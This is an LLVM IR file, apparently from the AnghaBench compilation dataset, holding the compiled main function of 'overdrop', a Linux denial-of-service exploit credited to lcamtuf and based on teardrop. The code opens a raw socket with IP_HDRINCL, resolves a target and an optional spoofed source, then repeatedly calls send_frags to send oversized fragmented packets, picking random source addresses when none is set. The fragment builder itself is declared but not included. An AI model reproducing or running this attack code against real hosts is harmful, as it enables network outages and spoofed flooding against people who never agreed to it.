; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_19301.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_19301.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i8* }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [59 x i8] c"overdrop by lcamtuf [based on teardrop by route|daemon9]\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"raw socket\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [11 x i8] c"IP_HDRINCL\00", align 1
@.str.3 = private unnamed_addr constant [36 x i8] c"Can't resolve destination address.\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"s:n:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [31 x i8] c"Can't resolve source address.\0A\00", align 1
@COUNT = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [34 x i8] c"Sending oversized packets:\0AFrom: \00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"       (random)\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"%15s\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"\0A  To: %15s\0A\00", align 1
@.str.10 = private unnamed_addr constant [11 x i8] c" Amt: %5d\0A\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"[ \00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"b00z \00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.in_addr, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %15 = load i32, i32* @stderr, align 4
  %16 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* @AF_INET, align 4
  %18 = load i32, i32* @SOCK_RAW, align 4
  %19 = load i32, i32* @IPPROTO_RAW, align 4
  %20 = call i32 @socket(i32 %17, i32 %18, i32 %19)
  store i32 %20, i32* %9, align 4
  %21 = icmp slt i32 %20, 0
  br i1 %21, label %22, label %25

22:                                               ; preds = %2
  %23 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %24 = call i32 @exit(i32 1) #3
  unreachable

25:                                               ; preds = %2
  %26 = load i32, i32* %9, align 4
  %27 = load i32, i32* @IPPROTO_IP, align 4
  %28 = load i32, i32* @IP_HDRINCL, align 4
  %29 = bitcast i32* %6 to i8*
  %30 = call i64 @setsockopt(i32 %26, i32 %27, i32 %28, i8* %29, i32 4)
  %31 = icmp slt i64 %30, 0
  br i1 %31, label %32, label %35

32:                                               ; preds = %25
  %33 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %34 = call i32 @exit(i32 1) #3
  unreachable

35:                                               ; preds = %25
  %36 = load i32, i32* %4, align 4
  %37 = icmp slt i32 %36, 2
  br i1 %37, label %38, label %43

38:                                               ; preds = %35
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @usage(i8* %41)
  br label %43

43:                                               ; preds = %38, %35
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i8* @name_resolve(i8* %46)
  store i8* %47, i8** %11, align 8
  %48 = icmp ne i8* %47, null
  br i1 %48, label %53, label %49

49:                                               ; preds = %43
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 (i32, i8*, ...) @fprintf(i32 %50, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0))
  %52 = call i32 @exit(i32 1) #3
  unreachable

53:                                               ; preds = %43
  br label %54

54:                                               ; preds = %79, %53
  %55 = load i32, i32* %4, align 4
  %56 = load i8**, i8*** %5, align 8
  %57 = call i32 @getopt(i32 %55, i8** %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  store i32 %57, i32* %8, align 4
  %58 = load i32, i32* @EOF, align 4
  %59 = icmp ne i32 %57, %58
  br i1 %59, label %60, label %80

60:                                               ; preds = %54
  %61 = load i32, i32* %8, align 4
  switch i32 %61, label %74 [
    i32 110, label %62
    i32 115, label %65
  ]

62:                                               ; preds = %60
  %63 = load i8*, i8** @optarg, align 8
  %64 = call i32 @atoi(i8* %63)
  store i32 %64, i32* %7, align 4
  br label %79

65:                                               ; preds = %60
  %66 = load i8*, i8** @optarg, align 8
  %67 = call i8* @name_resolve(i8* %66)
  store i8* %67, i8** %10, align 8
  %68 = icmp ne i8* %67, null
  br i1 %68, label %73, label %69

69:                                               ; preds = %65
  %70 = load i32, i32* @stderr, align 4
  %71 = call i32 (i32, i8*, ...) @fprintf(i32 %70, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.5, i64 0, i64 0))
  %72 = call i32 @exit(i32 1) #3
  unreachable

73:                                               ; preds = %65
  br label %79

74:                                               ; preds = %60
  %75 = load i8**, i8*** %5, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 0
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @usage(i8* %77)
  br label %79

79:                                               ; preds = %74, %73, %62
  br label %54

80:                                               ; preds = %54
  %81 = call i64 @time(i32 0)
  %82 = trunc i64 %81 to i32
  %83 = call i32 @srandom(i32 %82)
  %84 = load i32, i32* %7, align 4
  %85 = icmp ne i32 %84, 0
  br i1 %85, label %88, label %86

86:                                               ; preds = %80
  %87 = load i32, i32* @COUNT, align 4
  store i32 %87, i32* %7, align 4
  br label %88

88:                                               ; preds = %86, %80
  %89 = load i32, i32* @stderr, align 4
  %90 = call i32 (i32, i8*, ...) @fprintf(i32 %89, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.6, i64 0, i64 0))
  %91 = load i8*, i8** %10, align 8
  %92 = icmp ne i8* %91, null
  br i1 %92, label %96, label %93

93:                                               ; preds = %88
  %94 = load i32, i32* @stderr, align 4
  %95 = call i32 (i32, i8*, ...) @fprintf(i32 %94, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0))
  br label %104

96:                                               ; preds = %88
  %97 = load i8*, i8** %10, align 8
  %98 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i8* %97, i8** %98, align 8
  %99 = load i32, i32* @stderr, align 4
  %100 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  %101 = load i8*, i8** %100, align 8
  %102 = call i8* @inet_ntoa(i8* %101)
  %103 = call i32 (i32, i8*, ...) @fprintf(i32 %99, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i8* %102)
  br label %104

104:                                              ; preds = %96, %93
  %105 = load i8*, i8** %11, align 8
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i8* %105, i8** %106, align 8
  %107 = load i32, i32* @stderr, align 4
  %108 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  %109 = load i8*, i8** %108, align 8
  %110 = call i8* @inet_ntoa(i8* %109)
  %111 = call i32 (i32, i8*, ...) @fprintf(i32 %107, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0), i8* %110)
  %112 = load i32, i32* @stderr, align 4
  %113 = load i32, i32* %7, align 4
  %114 = call i32 (i32, i8*, ...) @fprintf(i32 %112, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.10, i64 0, i64 0), i32 %113)
  %115 = load i32, i32* @stderr, align 4
  %116 = call i32 (i32, i8*, ...) @fprintf(i32 %115, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  br label %117

117:                                              ; preds = %142, %104
  %118 = load i32, i32* %8, align 4
  %119 = load i32, i32* %7, align 4
  %120 = icmp slt i32 %118, %119
  br i1 %120, label %121, label %145

121:                                              ; preds = %117
  %122 = load i8*, i8** %10, align 8
  %123 = icmp ne i8* %122, null
  br i1 %123, label %131, label %124

124:                                              ; preds = %121
  %125 = load i32, i32* %9, align 4
  %126 = call i8* (...) @rand()
  %127 = load i8*, i8** %11, align 8
  %128 = call i8* (...) @rand()
  %129 = call i8* (...) @rand()
  %130 = call i32 @send_frags(i32 %125, i8* %126, i8* %127, i8* %128, i8* %129)
  br label %138

131:                                              ; preds = %121
  %132 = load i32, i32* %9, align 4
  %133 = load i8*, i8** %10, align 8
  %134 = load i8*, i8** %11, align 8
  %135 = call i8* (...) @rand()
  %136 = call i8* (...) @rand()
  %137 = call i32 @send_frags(i32 %132, i8* %133, i8* %134, i8* %135, i8* %136)
  br label %138

138:                                              ; preds = %131, %124
  %139 = load i32, i32* @stderr, align 4
  %140 = call i32 (i32, i8*, ...) @fprintf(i32 %139, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0))
  %141 = call i32 @usleep(i32 500)
  br label %142

142:                                              ; preds = %138
  %143 = load i32, i32* %8, align 4
  %144 = add nsw i32 %143, 1
  store i32 %144, i32* %8, align 4
  br label %117

145:                                              ; preds = %117
  %146 = load i32, i32* @stderr, align 4
  %147 = call i32 (i32, i8*, ...) @fprintf(i32 %146, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i8* @name_resolve(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @srandom(i32) #1

declare dso_local i64 @time(i32) #1

declare dso_local i8* @inet_ntoa(i8*) #1

declare dso_local i32 @send_frags(i32, i8*, i8*, i8*, i8*) #1

declare dso_local i8* @rand(...) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
